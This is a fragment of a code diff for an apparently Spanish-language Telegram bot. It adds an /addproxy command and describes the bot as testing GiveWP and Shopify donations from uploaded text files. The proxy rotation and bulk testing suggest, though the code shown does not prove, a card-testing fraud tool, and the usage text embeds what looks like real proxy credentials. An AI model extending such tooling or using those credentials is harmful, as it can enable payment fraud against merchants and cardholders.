+            "❌ Uso: /addproxy ip:puerto o ip:puerto:user:pass\n"
+            "Ejemplo: /addproxy 23.26.53.37:6003:ywdcxpbz:rumq51bx8tk3"
+        )
+        return
+    
+    proxy_input = " ".join(context.args)
+    line_type, normalized = detect_line_type(proxy_input)
+    
+    if line_type != 'proxy':
+        await update.message.reply_text("❌ Formato de proxy inválido")
+        return
+    
+    user_data = await user_manager.get_user_data(user_id)
+    user_data["proxies"].append(normalized)
+    await user_manager.update_user_data(user_id, proxies=user_data["proxies"])
+    
+    # Mostrar versión corta del proxy
+    display = normalized.split(':')[0] + ':' + normalized.split(':')[1]
+    await update.message.reply_text(f"✅ Proxy añadido: {display}")
 
 # ================== MAIN ==================
 async def shutdown(application: Application):
@@ -1542,6 +1845,7 @@ def main():
     # Comandos
     app.add_handler(CommandHandler("start", start))
     app.add_handler(CommandHandler("stop", stop_command))
+    app.add_handler(CommandHandler("addproxy", add_proxy))
     
     # Comandos GiveWP
     app.add_handler(CommandHandler("donate", donate))
@@ -1556,7 +1860,7 @@ def main():
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, message_handler))
     app.add_handler(MessageHandler(filters.Document.FileExtension("txt"), document_handler))
 
-    logger.info("🚀 Bot iniciado - Listo para probar donaciones GiveWP")
+    logger.info("🚀 Bot iniciado - Shopify + GiveWP - Detección inteligente de archivos")
     app.run_polling()
 
 if __name__ == "__main__":
